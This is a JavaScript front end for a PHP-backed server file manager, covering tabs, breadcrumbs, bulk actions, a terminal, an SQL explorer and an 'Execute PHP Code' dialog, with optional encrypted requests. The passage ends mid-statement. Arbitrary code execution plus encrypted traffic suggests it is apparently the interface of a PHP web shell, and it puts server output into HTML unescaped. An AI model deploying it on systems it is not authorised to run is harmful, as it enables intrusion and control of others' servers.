document.addEventListener('DOMContentLoaded', function () {
    const csrf = phpVars.csrf;
    let currentDir = phpVars.currentDir;
    const isEnc = phpVars.isEnc;
    const key = CryptoJS.enc.Utf8.parse(phpVars.encryptionKey);
    const homeDir = phpVars.currentDir;
    let updir;
 
    document.getElementById('sql-tab')?.addEventListener('click', function() {
        if (typeof window.initSQLExplorer === 'function') {
            window.initSQLExplorer();
        }
    });
    
    if (typeof window.initContextMenu === 'function') {
        window.initContextMenu();
    }
    
    const savedTabs = loadTabsFromLocalStorage();
    window.fileManagerState = window.fileManagerState || {
        tabs: savedTabs.tabs || [{
            id: 'tab-1',
            path: phpVars.currentDir,
            active: true,
            name: 'Root',
            type: 'filemanager'
        }],
        activeTabId: savedTabs.activeTabId || 'tab-1',
        selectedFiles: [],
        currentDir: phpVars.currentDir,
        currentSort: { column: 'name', direction: 'asc' }
    };
    
    if (window.loadTabsFromLocalStorage && window.loadTabsFromLocalStorage()) {
        console.log('Tabs loaded from localStorage');
        
        const activeTab = fileManagerState.tabs.find(tab => tab.active);
        if (activeTab && activeTab.path) {
            currentDir = activeTab.path;
            window.fileManagerState.currentDir = currentDir;
        }
    }
    
    exposeUtilityFunctions();
    
    initGlobalKeyboardShortcuts();

    window.clearFileSelection = function() {
        if (window.fileManagerState) {
            window.fileManagerState.selectedFiles = [];
        }
        
        document.querySelectorAll('.file-checkbox:checked').forEach(checkbox => {
            checkbox.checked = false;
        });
        
        let selectAllCheckbox = document.getElementById('selectAll');
        if (selectAllCheckbox) {
            selectAllCheckbox.checked = false;
            selectAllCheckbox.indeterminate = false;
        }
        
        document.querySelectorAll('#fileList tr.bg-blue-50, #fileList tr.dark\\:bg-blue-900\\/20').forEach(row => {
            row.classList.remove('bg-blue-50', 'dark:bg-blue-900/20');
        });
    };

    var path = phpVars.terPWD;
    var command = '';
    var command_history = [];
    var history_index = 0;
    var suggest = false;
    var blink_position = 0;
    var autocomplete_position = 0;
    var autocomplete_search_for = '';
    var autocomplete_temp_results = [];
    var autocomplete_current_result = '';
    let commands_list = phpVars.cmList;
    let editor;
    window.editorThemePreference = localStorage.getItem('editor-theme');
    if (window.editorThemePreference === 'system') {
        window.editorThemePreference = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'vs-dark' : 'vs';
    }

    let currentPage = 1;
    let totalPages = 1;
    let files = []; 

    let clipboard = { action: "", path: [] };

    function checkFlowbiteLoaded() {
        if (typeof window.flowbite !== 'undefined') {
            console.log('Flowbite detected, initializing components');
            
            if (window.flowbite.initTabs) {
                window.flowbite.initTabs();
            }
            
            setTimeout(() => {
                initEnhancedTabs();
            }, 100);
        } else {
            setTimeout(checkFlowbiteLoaded, 50);
        }
    }
    

    function showDialog(title, message, confirmButtonText, defaultValue = '', callback) {
        const isDarkMode = document.documentElement.classList.contains('dark');
        
        Swal.fire({
            title: title,
            html: `
                <div class="flex flex-col w-full">
                    <label for="dialog-input" class="text-left mb-2 text-gray-700 dark:text-gray-300 text-sm font-medium">${message}</label>
                    <input id="dialog-input" type="text" value="${defaultValue}" class="w-full p-3 text-gray-800 dark:text-gray-200 bg-white dark:bg-gray-700 border border-gray-300 dark:border-gray-600 rounded-md shadow-sm focus:border-blue-500 focus:ring focus:ring-blue-500 focus:ring-opacity-50">
                </div>
            `,
            showCancelButton: true,
            confirmButtonText: confirmButtonText,
            cancelButtonText: 'Cancel',
            customClass: {
                popup: 'dark:bg-gray-800 dark:text-gray-200',
                title: 'text-gray-800 dark:text-gray-200',
                confirmButton: 'bg-blue-600 hover:bg-blue-700 text-white',
                cancelButton: 'bg-gray-500 hover:bg-gray-600 text-white'
            },
            background: isDarkMode ? '#1F2937' : '#FFFFFF',
            focusConfirm: false,
            preConfirm: () => {
                const value = document.getElementById('dialog-input').value;
                if (!value || value.trim() === '') {
                    Swal.showValidationMessage('You need to enter a value!');
                    return false;
                }
                return value;
            }
        }).then((result) => {
            if (result.isConfirmed && result.value) {
                callback(result.value);
            }
        });
    }

    function showRenameDialog(title, message, confirmButtonText, defaultValue = '', callback) {
        const isDarkMode = document.documentElement.classList.contains('dark');
        
        Swal.fire({
            title: title,
            html: `
                <div class="flex flex-col w-full">
                    <label for="rename-input" class="text-left mb-2 text-gray-700 dark:text-gray-300 text-sm font-medium">${message}</label>
                    <input id="rename-input" type="text" value="${defaultValue}" class="w-full p-3 text-gray-800 dark:text-gray-200 bg-white dark:bg-gray-700 border border-gray-300 dark:border-gray-600 rounded-md shadow-sm focus:border-blue-500 focus:ring focus:ring-blue-500 focus:ring-opacity-50">
                </div>
            `,
            showCancelButton: true,
            confirmButtonText: confirmButtonText,
            cancelButtonText: 'Cancel',
            customClass: {
                popup: 'dark:bg-gray-800 dark:text-gray-200',
                title: 'text-gray-800 dark:text-gray-200',
                confirmButton: 'bg-blue-600 hover:bg-blue-700 text-white',
                cancelButton: 'bg-gray-500 hover:bg-gray-600 text-white'
            },
            background: isDarkMode ? '#1F2937' : '#FFFFFF',
            focusConfirm: false,
            preConfirm: () => {
                const value = document.getElementById('rename-input').value;
                if (!value || value.trim() === '') {
                    Swal.showValidationMessage('You need to enter a value!');
                    return false;
                }
                return value;
            }
        }).then((result) => {
            if (result.isConfirmed && result.value) {
                callback(result.value);
            }
        });
    }

    function showZipCreationDialog(title, message, confirmButtonText, defaultValue = '', callback) {
        const isDarkMode = document.documentElement.classList.contains('dark');
        const darkModeClasses = isDarkMode ? 
            'bg-gray-800 text-white border-gray-700' : 
            'bg-white text-gray-900 border-gray-300';
            
        Swal.fire({
            title: title,
            html: `
                <div class="flex flex-col space-y-4">
                    <div class="w-full">
                        <label for="zipFileName" class="text-sm font-medium block mb-1">
                            ${message}
                        </label>
                        <input id="zipFileName" type="text" value="${defaultValue}" 
                               class="w-full p-2 border rounded ${darkModeClasses}">
                    </div>
                    <div class="w-full">
                        <label for="compressionLevel" class="text-sm font-medium block mb-1">
                            Compression Level:
                        </label>
                        <select id="compressionLevel" class="w-full p-2 border rounded ${darkModeClasses}">
                            <option value="0">Store only (no compression)</option>
                            <option value="1">Fastest (lowest compression)</option>
                            <option value="5" selected>Normal (balanced)</option>
                            <option value="9">Maximum (slowest)</option>
                        </select>
                    </div>
                    <div class="w-full">
                        <label for="archiveFormat" class="text-sm font-medium block mb-1">
                            Archive Format:
                        </label>
                        <select id="archiveFormat" class="w-full p-2 border rounded ${darkModeClasses}">
                            <option value="zip" selected>ZIP (.zip)</option>
                            <option value="tar">TAR (.tar)</option>
                            <option value="tar.gz">TAR GZ (.tar.gz)</option>
                            <option value="tar.bz2">TAR BZ2 (.tar.bz2)</option>
                            <option value="tar.xz">TAR XZ (.tar.xz)</option>
                            <option value="gz">GZIP (.gz)</option>
                        </select>
                    </div>
                </div>
            `,
            focusConfirm: false,
            showCancelButton: true,
            confirmButtonText: confirmButtonText,
            cancelButtonText: 'Cancel',
            customClass: {
                popup: isDarkMode ? 'bg-gray-800 text-white' : 'bg-white text-gray-900',
                confirmButton: 'bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded',
                cancelButton: 'bg-gray-500 hover:bg-gray-600 text-white font-bold py-2 px-4 rounded mr-2'
            },
            preConfirm: () => {
                const zipFileName = document.getElementById('zipFileName').value;
                const compressionLevel = document.getElementById('compressionLevel').value;
                const archiveFormat = document.getElementById('archiveFormat').value;
                
                if (!zipFileName) {
                    Swal.showValidationMessage('Please enter a filename');
                    return false;
                }
                
                return {
                    zipFileName: zipFileName,
                    compressionLevel: compressionLevel,
                    archiveFormat: archiveFormat
                };
            }
        }).then((result) => {
            if (result.isConfirmed && result.value) {
                callback(result.value);
            }
        });
    }

    function showConfirmation(title, message, confirmButtonText, callback) {
        const isDarkMode = document.documentElement.classList.contains('dark');
        
        Swal.fire({
            title: title,
            text: message,
            icon: 'warning',
            iconColor: isDarkMode ? '#FBBF24' : '#F59E0B', 
            showCancelButton: true,
            confirmButtonText: confirmButtonText,
            cancelButtonText: 'Cancel',
            customClass: {
                popup: 'dark:bg-gray-800 dark:text-gray-200',
                title: 'text-gray-800 dark:text-gray-200',
                confirmButton: 'bg-blue-600 hover:bg-blue-700 text-white',
                cancelButton: 'bg-gray-500 hover:bg-gray-600 text-white'
            },
            background: isDarkMode ? '#1F2937' : '#FFFFFF'
        }).then((result) => {
            if (result.isConfirmed) {
                callback();
            }
        });
    }

    const defaultItemsPerPage = localStorage.getItem('default-items-per-page');
    if (defaultItemsPerPage) {
        const itemLimitElement = document.getElementById('itemLimit');
        if (itemLimitElement) {
            itemLimitElement.value = defaultItemsPerPage;
        }
    }

    const tabsLoaded = loadTabsFromLocalStorage();
    
    if (tabsLoaded) {
        const activeTab = fileManagerState.tabs.find(tab => tab.active);
        if (activeTab) {
            currentDir = activeTab.path;
         }
    }

    initializeFileManager(csrf, currentDir, isEnc, key);
    
    renderTabs();
    initTabEvents();
    
    initThemeToggle();

    initSettings();

    const selectAllCheckbox = document.getElementById('selectAll');
    if (selectAllCheckbox) {
        selectAllCheckbox.removeEventListener('change', selectAllChangeHandler);
        selectAllCheckbox.addEventListener('change', selectAllChangeHandler);
    }
    
    function selectAllChangeHandler(event) {
        console.log('Select All checkbox changed:', event.target.checked);
        const isChecked = event.target.checked;
        const fileCheckboxes = document.querySelectorAll('.file-checkbox');
        console.log('Found file checkboxes:', fileCheckboxes.length);
        
        if (!window.fileManagerState) {
            window.fileManagerState = { 
                selectedFiles: [],
                currentSort: { column: 'name', direction: 'asc' }
            };
        }
        
        window.fileManagerState.selectedFiles = [];
        
        fileCheckboxes.forEach(checkbox => {
            checkbox.checked = isChecked;
            
            if (isChecked) {
                const fullPath = checkbox.dataset.fullPath || checkbox.dataset.file;
                updateSelectedFiles(fullPath, true, true);
                
                const row = checkbox.closest('tr');
                row.classList.add('bg-blue-50', 'dark:bg-blue-900/20');
            } else {
                const row = checkbox.closest('tr');
                row.classList.remove('bg-blue-50', 'dark:bg-blue-900/20');
            }
        });
        
        console.log('Updated selected files:', window.fileManagerState.selectedFiles);
        console.log('Selected file count:', window.fileManagerState.selectedFiles.length);
    }

    const fileList = document.getElementById('fileList');
    if (fileList) {
        fileList.addEventListener('change', function (event) {
            if (event.target.classList.contains('file-checkbox')) {
                const isChecked = event.target.checked;
                updateSelectedFiles(event.target.dataset.file, isChecked);

                const fileCheckboxes = document.querySelectorAll('.file-checkbox');
                const allChecked = Array.from(fileCheckboxes).every(checkbox => checkbox.checked);
                const anyChecked = Array.from(fileCheckboxes).some(checkbox => checkbox.checked);

                if (selectAllCheckbox) {
                    selectAllCheckbox.checked = allChecked;
                    selectAllCheckbox.indeterminate = !allChecked && anyChecked;
                }
            }
        });
    }

    document.addEventListener('click', function (event) {
        if (event.target.classList.contains('fa-trash-alt')) {
            const fileName = event.target.dataset.file;
            deleteFile(fileName, csrf, currentDir, key, isEnc);
        }
    });

    function saveSelectedCheckboxes() {
        const selectedFiles = Array.from(document.querySelectorAll('.file-checkbox:checked'))
            .map(checkbox => checkbox.dataset.file)
            .filter(file => file !== '.' && file !== '..'); 

        localStorage.setItem('selectedFiles', JSON.stringify(selectedFiles));

        return selectedFiles;
    }

    $('.fa-folder-plus').click(function () {
        showDialog(
            'Create Folder',
            'Enter the name of new folder: ',
            'mkdir',
            'NewFolder',
            (dirName) => {
                if (dirName) {
                    data = {
                        csrf: csrf,
                        action: 'mkdir',
                        dir: currentDir,
                        dirName: dirName
                    };
                    handleCreate(data, 'folder', key, isEnc, currentDir, csrf);
                }
            }
        );
    });

    $('.fa-file-circle-plus').click(function () {
        showDialog(
            'Create File',
            'Enter the name of new File: ',
            'touch',
            'File',
            (dirName) => {
                if (dirName) {
                    data = {
                        csrf: csrf,
                        action: 'touch',
                        dir: currentDir,
                        dirName: dirName
                    };
                    handleCreate(data, 'file', key, isEnc, currentDir, csrf);
                }
            }
        );
    });

    $('.codeme').click(function () {
        showDialog(
            'Execute PHP Code',
            'Enter the PHP code to execute:',
            'Execute',
            '',
            (phpCode) => {
                if (phpCode && phpCode.trim() !== '') {
                    sendRequest({ 
                        csrf, 
                        action: 'execute', 
                        code: phpCode.trim(), 
                        dir: currentDir 
                    }, key, isEnc)
                    .then(result => {
                        if (result.output) {
                            triggerAlert('success', 'Code executed successfully');
                            Swal.fire({
                                title: 'Execution Result',
                                html: `<pre class="text-left">${result.output}</pre>`,
                                width: '80%',
                                customClass: {
                                    popup: 'dark:bg-gray-800 dark:text-white',
                                    htmlContainer: 'overflow-auto max-h-[70vh]'
                                }
                            });
                        }
                    })
                    .catch(error => {
                        triggerAlert('warning', 'Error executing code: ' + error);
                    });
                }
            }
        );
    });

    $('#searchBar').on('keyup', function() {
        const searchQuery = $(this).val().toLowerCase();
        console.log('Search query:', searchQuery);
        
        if (searchQuery.length > 0) {
            $('#clearSearch').show();
        } else {
            $('#clearSearch').hide();
        }
        
        if (!window.fileManagerState) {
            window.fileManagerState = { 
                selectedFiles: [],
                currentSort: { column: 'name', direction: 'asc' },
                files: []
            };
        } else if (!window.fileManagerState.currentSort) {
            window.fileManagerState.currentSort = { column: 'name', direction: 'asc' };
        }
        
        if (typeof window.renderFiles === 'function') {
            window.renderFiles(window.fileManagerState.files, currentDir, csrf, key, isEnc);
        } else {
            console.error('renderFiles function not found');
        }
    });
    
    $('#clearSearch').on('click', function() {
        $('#searchBar').val('').focus();
        $(this).hide();
        
        if (typeof window.renderFiles === 'function' && window.fileManagerState) {
            window.renderFiles(window.fileManagerState.files, currentDir, csrf, key, isEnc);
        }
    });
    
    document.addEventListener('click', function (event) {
        if (event.target.classList.contains('fa-download')) {
            const filePath = event.target.dataset.file;
            downloadFile(filePath, csrf, key, isEnc);
        }
    });

    $(window).on('scroll', function () {
        if ($(window).scrollTop() + $(window).height() >= $(document).height() - 100) {
            let itemLimitElement = document.getElementById('itemLimit').value;
            if (fileManagerState.currentPage < fileManagerState.totalPages && !fileManagerState.isLoading) {
                fileManagerState.currentPage++;
                loadDirectory(currentDir, fileManagerState.currentPage, csrf, key, isEnc,itemLimitElement);
            }
        }
    });

    $('th[data-sort]').click(function () {
        const column = $(this).data('sort'); 
        console.log('Sorting by column:', column);

        if (!window.fileManagerState) {
            window.fileManagerState = { 
                selectedFiles: [],
                currentSort: { column: 'name', direction: 'asc' }
            };
        } else if (!window.fileManagerState.currentSort) {
            window.fileManagerState.currentSort = { column: 'name', direction: 'asc' };
        }

        if (window.fileManagerState.currentSort.column === column) {
            window.fileManagerState.currentSort.direction = 
                window.fileManagerState.currentSort.direction === 'asc' ? 'desc' : 'asc';
        } else {
            window.fileManagerState.currentSort.column = column;
            window.fileManagerState.currentSort.direction = 'asc';
        }
        
        console.log('Sort state:', window.fileManagerState.currentSort);

        if (typeof window.sortFiles === 'function') {
            window.sortFiles();
        } else {
            console.error('sortFiles function not found');
        }
        
        if (typeof window.renderFiles === 'function') {
            window.renderFiles(window.fileManagerState.files, currentDir, csrf, key, isEnc);
        } else {
            console.error('renderFiles function not found');
        }
        
        $('th[data-sort]').find('i.fas').removeClass('fa-sort-up fa-sort-down').addClass('fa-sort');
        const icon = $(this).find('i.fas');
        icon.removeClass('fa-sort');
        if (window.fileManagerState.currentSort.direction === 'asc') {
            icon.addClass('fa-sort-up');
        } else {
            icon.addClass('fa-sort-down');
        }
    });

    $(document).on('click', '.directory-link', function (e) {
        e.preventDefault();
        let itemLimitElement = document.getElementById('itemLimit').value;

        const newDir = $(this).data('path');
        if (newDir && newDir !== currentDir) {
            currentDir = newDir;  
            updir = currentDir;
            console.log(updir);
            updateCurrentPath(); 
            loadDirectory(currentDir, 1, csrf, key, isEnc,itemLimitElement);  
            
            updateActiveTabPath(currentDir);
        }
    });

    window.updateCurrentPath = function() {
        updateBreadcrumbs(currentDir); 
    }

    function updateBreadcrumbs(path) {
        const breadcrumbsContainer = $('#breadcrumbs ol');
        const parts = path.split('/').filter(part => part !== ''); 
        let breadcrumbsHtml = '';

        breadcrumbsHtml += `
            <li class="inline-flex items-center">
                <a href="#" class="breadcrumb-link" data-path="/">
                    /
                </a>
            </li>
        `;

        parts.forEach((part, index) => {
            const partialPath = '/' + parts.slice(0, index + 1).join('/'); 
            breadcrumbsHtml += `
                <li class="inline-flex items-center">
                    <i class="fas fa-chevron-right mx-2 text-gray-500"></i>
                    <a href="#" class="breadcrumb-link" data-path="${partialPath}">${part}</a>
                </li>
            `;
        });

        breadcrumbsContainer.html(breadcrumbsHtml);
    }

    $('#breadcrumbs').on('dblclick', function (e) {
        console.log('Double-click detected');
        e.preventDefault(); 

        const $container = $('#breadcrumbs ol');
        const originalPath = currentDir; 
        const $input = $('<input>', {
            type: 'text',
            value: originalPath,
            class: 'w-96 px-2 py-1 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:text-white'
        });
        console.log('originalPath' + originalPath);

        $container.html(`<li class="inline-flex items-center">${$input.prop('outerHTML')}</li>`);

        $container.find('input').focus();

        $container.find('input').on('blur', function () {
            const newPath = $(this).val().trim();
            
                updateBreadcrumbs(originalPath);
        });

        $container.find('input').on('keydown', function (e) {
            if (e.keyCode === 13) { 
                e.preventDefault();
                const newPath = $(this).val().trim();
                
                if (newPath) {
                    currentDir = newPath;
                    updateCurrentPath();
                    loadDirectory(currentDir, 1, csrf, key, isEnc);
                    updateActiveTabPath(currentDir);
                }
            }
        });
    });

    $(document).on('click', '.breadcrumb-link', function (e) {
        e.preventDefault();
        const newDir = $(this).data('path');
        if (newDir) {
            currentDir = newDir; 
            updateCurrentPath(); 
            updir = currentDir;
            console.log(updir);
            loadDirectory(currentDir, 1, csrf, key, isEnc); 
            
            updateActiveTabPath(currentDir);
        }
    });
    
    $(document).on('click', '#goHome', function(e) {
        e.preventDefault();
        currentDir = homeDir;
        updateCurrentPath();
        updir = currentDir;
        loadDirectory(currentDir, 1, csrf, key, isEnc);
        
        updateActiveTabPath(currentDir);
        
        $(this).addClass('animate-pulse');
        setTimeout(() => {
            $(this).removeClass('animate-pulse');
        }, 300);
    });
    
    function renderTabs() {
        const tabsContainer = document.getElementById('location-tabs');
        if (!tabsContainer) return;
        
        tabsContainer.innerHTML = '';
        
        fileManagerState.tabs.forEach(tab => {
            const tabElement = document.createElement('li');
            tabElement.className = 'mr-1 flex-shrink-0';
            tabElement.setAttribute('role', 'presentation');
            
            const displayName = tab.name || getLastPathSegment(tab.path);
            
            let tabIcon = 'fa-folder';
            if (displayName === 'Root' || displayName === 'Home') {
                tabIcon = 'fa-home';
            }
            
            const activeClasses = 'inline-flex items-center p-3 border-b-2 rounded-t-lg text-blue-600 border-blue-600 active dark:text-blue-500 dark:border-blue-500 bg-white dark:bg-gray-800 shadow-sm';
            const inactiveClasses = 'inline-flex items-center p-3 border-b-2 border-transparent rounded-t-lg hover:text-gray-600 hover:border-gray-300 dark:hover:text-gray-300 dark:hover:border-gray-300 bg-gray-50 dark:bg-gray-700 hover:bg-gray-100 dark:hover:bg-gray-600';
            
            tabElement.innerHTML = `
                <button class="${tab.active ? activeClasses : inactiveClasses} transition-all duration-200 group" 
                        data-tab-id="${tab.id}" 
                        type="button" 
                        role="tab">
                    <i class="fas ${tabIcon} mr-2 ${tab.active ? 'text-blue-500' : 'group-hover:text-blue-400'} transition-colors"></i>
                    <span class="truncate max-w-[100px] md:max-w-[150px]">${displayName}</span>
                    ${tab.id !== 'tab-1' ? `
                        <i class="fas fa-times ml-2 p-1 hover:bg-gray-200 dark:hover:bg-gray-600 rounded-full text-xs opacity-0 group-hover:opacity-100 hover:text-red-500 transition-all" data-close-tab="${tab.id}"></i>
                    ` : ''}
                </button>
            `;
            
            tabsContainer.appendChild(tabElement);
        });
        
        const activeTab = tabsContainer.querySelector('button[data-tab-id="' + fileManagerState.activeTabId + '"]');
        if (activeTab) {
            activeTab.classList.add('animate-pulse');
            setTimeout(() => {
                activeTab.classList.remove('animate-pulse');
            }, 500);
            
            requestAnimationFrame(() => {
                const tabRect = activeTab.getBoundingClientRect();
                const containerRect = tabsContainer.getBoundingClientRect();
                
                if (tabRect.left < containerRect.left) {
                    tabsContainer.scrollLeft += tabRect.left - containerRect.left - 16;
                } else if (tabRect.right > containerRect.right) {
                    tabsContainer.scrollLeft += tabRect.right - containerRect.right + 16;
                }
            });
        }
        
        checkTabOverflow();
    }
    
    function checkTabOverflow() {
        const tabsContainer = document.getElementById('location-tabs');
        if (!tabsContainer) return;
        
        const isOverflowing = tabsContainer.scrollWidth > tabsContainer.clientWidth;
        
        if (isOverflowing) {
            tabsContainer.classList.add('tabs-overflow');
            
            if (!document.getElementById('tab-scroll-left')) {
                const scrollLeftBtn = document.createElement('button');
                scrollLeftBtn.id = 'tab-scroll-left';
                scrollLeftBtn.className = 'absolute left-0 top-0 bottom-0 px-1 bg-gradient-to-r from-white to-transparent dark:from-gray-800 dark:to-transparent z-10 opacity-80 hover:opacity-100 transition-opacity';
                scrollLeftBtn.innerHTML = '<i class="fas fa-chevron-left"></i>';
                scrollLeftBtn.addEventListener('click', () => {
                    tabsContainer.scrollBy({ left: -150, behavior: 'smooth' });
                });
                
                const scrollRightBtn = document.createElement('button');
                scrollRightBtn.id = 'tab-scroll-right';
                scrollRightBtn.className = 'absolute right-0 top-0 bottom-0 px-1 bg-gradient-to-l from-white to-transparent dark:from-gray-800 dark:to-transparent z-10 opacity-80 hover:opacity-100 transition-opacity';
                scrollRightBtn.innerHTML = '<i class="fas fa-chevron-right"></i>';
                scrollRightBtn.addEventListener('click', () => {
                    tabsContainer.scrollBy({ left: 150, behavior: 'smooth' });
                });
                
                tabsContainer.parentElement.appendChild(scrollLeftBtn);
                tabsContainer.parentElement.appendChild(scrollRightBtn);
            }
        } else {
            tabsContainer.classList.remove('tabs-overflow');
            document.getElementById('tab-scroll-left')?.remove();
            document.getElementById('tab-scroll-right')?.remove();
        }
    }
    
    function initTabEvents() {
        $(document).on('click', '#location-tabs button', function(e) {
            if (e.target.classList.contains('fa-times')) return; 
            
            const tabId = $(this).data('tab-id');
            
            const tab = fileManagerState.tabs.find(t => t.id === tabId);
            if (!tab) return;
            
            document.querySelectorAll('[role="tabpanel"]').forEach(panel => {
                panel.classList.add('hidden');
            });
            
            document.querySelectorAll('[data-tabs-target]').forEach(tab => {
                const target = tab.getAttribute('data-tabs-target');
                if (target && document.querySelector(target)) {
                    document.querySelector(target).classList.add('hidden');
                }
            });
            
            switchToTab(tabId);
            
            const ripple = document.createElement('span');
            ripple.className = 'absolute inset-0 bg-blue-500 opacity-30 rounded-t-lg animate-ripple';
            this.appendChild(ripple);
            setTimeout(() => ripple.remove(), 600);
        });
        
        $(document).on('click', '[data-close-tab]', function(e) {
            e.stopPropagation();
            const tabId = $(this).data('close-tab');
            const tabElement = $(this).closest('li');
            
            tabElement.addClass('animate-tab-closing');
            setTimeout(() => {
                closeTab(tabId);
            }, 150);
        });
        
        $('#add-tab-btn').click(function() {
            addNewTab();
            
            $(this).addClass('animate-pulse');
            setTimeout(() => {
                $(this).removeClass('animate-pulse');
            }, 500);
        });
        
        window.addEventListener('resize', debounce(checkTabOverflow, 100));
    }
    
    function debounce(func, wait) {
        let timeout;
        return function executedFunction(...args) {
            const later = () => {
                clearTimeout(timeout);
                func(...args);
            };
            clearTimeout(timeout);
            timeout = setTimeout(later, wait);
        };
    }
    
    function switchToTab(tabId) {
        const tab = fileManagerState.tabs.find(t => t.id === tabId);
        if (!tab) return;
        
        fileManagerState.tabs.forEach(t => t.active = false);
        
        tab.active = true;
        fileManagerState.activeTabId = tabId;
        
        renderTabs();
         
        saveTabsToLocalStorage();
        
        document.querySelectorAll('[role="tabpanel"]').forEach(panel => {
            panel.classList.add('hidden');
        });
        
        let tabContentEl = document.getElementById(`${tabId}-content`);
        if (!tabContentEl) {
            console.log('Creating tab content element for tab:', tabId);
            const tabsContent = document.getElementById('tabs-content');
            if (!tabsContent) {
                console.error('Tabs content container not found!');
                return;
            }
            
            tabContentEl = document.createElement('div');
            tabContentEl.id = `${tabId}-content`;
            tabContentEl.className = 'tabs-panel w-full';
            tabsContent.appendChild(tabContentEl);
        }
        
        document.querySelectorAll('.tabs-panel').forEach(panel => {
            panel.classList.add('hidden');
        });
        
        tabContentEl.classList.remove('hidden');
        
        if (tab.type === 'editor' || tab.type === 'search') {
            console.log('Handling editor/search tab');
            const fileManagerUI = document.getElementById('fileManagerUI');
            if (fileManagerUI) {
                console.log('Hiding fileManagerUI');
                fileManagerUI.style.display = 'none';
            } else {
                console.warn('fileManagerUI element not found');
            }
            
            const editorContainer = tabContentEl.querySelector('.editor-container');
            if (editorContainer) {
                editorContainer.style.height = '90vh';
                editorContainer.style.width = '100%';
                
                if (window.editor) {
                    setTimeout(() => window.editor.refresh(), 10);
                }
            }
        } else {
            const fileManagerUI = document.getElementById('fileManagerUI');
            const fileTabContent = document.getElementById('file');
            
            if (fileManagerUI) {
                console.log('Showing fileManagerUI');
                fileManagerUI.style.display = 'block';
                
                if (fileTabContent) {
                    fileTabContent.classList.remove('hidden');
                }
                
                currentDir = tab.path;
                updateCurrentPath();
                loadDirectory(currentDir, 1, csrf, key, isEnc);
            } else {
                console.warn('fileManagerUI element not found');
            }
        }
    }
    
    window.switchToTab = function(tabId) {
        const tab = fileManagerState.tabs.find(t => t.id === tabId);
        if (!tab) return;
        
        fileManagerState.tabs.forEach(t => t.active = false);
        
        tab.active = true;
        fileManagerState.activeTabId = tabId;
        
        renderTabs();
         
        document.querySelectorAll('[role="tabpanel"]').forEach(panel => {
            panel.classList.add('hidden');
        });
        
        let tabContentEl = document.getElementById(`${tabId}-content`);
        if (!tabContentEl) {
            console.log('Creating tab content element for tab:', tabId);
            const tabsContent = document.getElementById('tabs-content');
            if (!tabsContent) {
                console.error('Tabs content container not found!');
                return;
            }
            
            tabContentEl = document.createElement('div');
            tabContentEl.id = `${tabId}-content`;
            tabContentEl.className = 'tabs-panel w-full';
            tabsContent.appendChild(tabContentEl);
        }
        
        document.querySelectorAll('.tabs-panel').forEach(panel => {
            panel.classList.add('hidden');
        });
        
        tabContentEl.classList.remove('hidden');
        
        if (tab.type === 'editor' || tab.type === 'search') {
            console.log('Handling editor/search tab');
            const fileManagerUI = document.getElementById('fileManagerUI');
            if (fileManagerUI) {
                console.log('Hiding fileManagerUI');
                fileManagerUI.style.display = 'none';
            } else {
                console.warn('fileManagerUI element not found');
            }
            
            const editorContainer = tabContentEl.querySelector('.editor-container');
            if (editorContainer) {
                editorContainer.style.height = '90vh';
                editorContainer.style.width = '100%';
                
                if (window.editor) {
                    setTimeout(() => window.editor.refresh(), 10);
                }
            }
        } else {
            const fileManagerUI = document.getElementById('fileManagerUI');
            const fileTabContent = document.getElementById('file');
            
            if (fileManagerUI) {
                console.log('Showing fileManagerUI');
                fileManagerUI.style.display = 'block';
                
                if (fileTabContent) {
                    fileTabContent.classList.remove('hidden');
                }
                
                currentDir = tab.path;
                updateCurrentPath();
                loadDirectory(currentDir, 1, csrf, key, isEnc);
            } else {
                console.warn('fileManagerUI element not found');
            }
        }
    }
    
    function closeTab(tabId) {
        if (fileManagerState.tabs.length <= 1) return;
        
        const tabIndex = fileManagerState.tabs.findIndex(t => t.id === tabId);
        if (tabIndex === -1) return;
        
        const isActiveTab = fileManagerState.tabs[tabIndex].active;
        
        fileManagerState.tabs.splice(tabIndex, 1);
        
        if (isActiveTab) {
            const newActiveIndex = Math.max(0, tabIndex - 1);
            fileManagerState.tabs[newActiveIndex].active = true;
            fileManagerState.activeTabId = fileManagerState.tabs[newActiveIndex].id;
            
            currentDir = fileManagerState.tabs[newActiveIndex].path;
            updateCurrentPath();
            loadDirectory(currentDir, 1, csrf, key, isEnc);
        }
        
        renderTabs();
        
        saveTabsToLocalStorage();
    }
    
    window.addNewTab = function(tabName = null, type = 'filemanager') {
        const newTabId = `tab-${Date.now()}`;
        
        fileManagerState.tabs.forEach(t => t.active = false);
        
        fileManagerState.tabs.push({
            id: newTabId,
            path: currentDir, 
            active: true,
            name: tabName || getLastPathSegment(currentDir),
            type: type 
        });
        
        fileManagerState.activeTabId = newTabId;
        
        renderTabs();
        
        saveTabsToLocalStorage();
        
        return newTabId;
    }
    
    function addNewTab(tabName, type = 'filemanager') {
        return window.addNewTab(tabName, type);
    }
    
    window.updateActiveTabPath = function(newPath) {
        const activeTab = fileManagerState.tabs.find(t => t.id === fileManagerState.activeTabId);
        if (activeTab) {
            activeTab.path = newPath;
            activeTab.name = getLastPathSegment(newPath);
            renderTabs();
            
            saveTabsToLocalStorage();
        }
    }
    
    function getLastPathSegment(path) {
        const cleanPath = path.endsWith('/') ? path.slice(0, -1) : path;
        
        if (cleanPath === '' || cleanPath === '/') {
            return 'Root';
        }
        
        const segments = cleanPath.split('/');
        return segments[segments.length - 1] || 'Root';
    }

    $('#bulkActions').change(function () {
        const action = $(this).val(); 
        
        setTimeout(() => {
            $(this).val('');
        }, 100);
        
        const getSelectedFiles = () => {
        const checkedBoxes = document.querySelectorAll('.file-checkbox:checked');
            const selectedFiles = [];
            
                checkedBoxes.forEach(checkbox => {
                const filePath = checkbox.dataset.fullPath || checkbox.dataset.file;
                if (filePath) {
                    selectedFiles.push(filePath);
                    }
                });
            
            return selectedFiles;
        };
        
        const selectedFiles = getSelectedFiles();
        
        console.log('Bulk action triggered:', action);
        console.log('Selected files:', selectedFiles);
        console.log('Selected files count:', selectedFiles.length);

        if (selectedFiles.length === 0 && action !== 'paste') {
            triggerAlert('info', 'No files selected! Please select files to perform bulk actions.');
            return;
        }

        switch (action) {
            case 'delete':
                showConfirmation(
                    'Delete Files',
                    `Are you sure you want to delete ${selectedFiles.length} file(s)?`,
                    'Delete',
                    () => {
                        const filesToDelete = getSelectedFiles();
                        
                        if (filesToDelete.length > 0) {
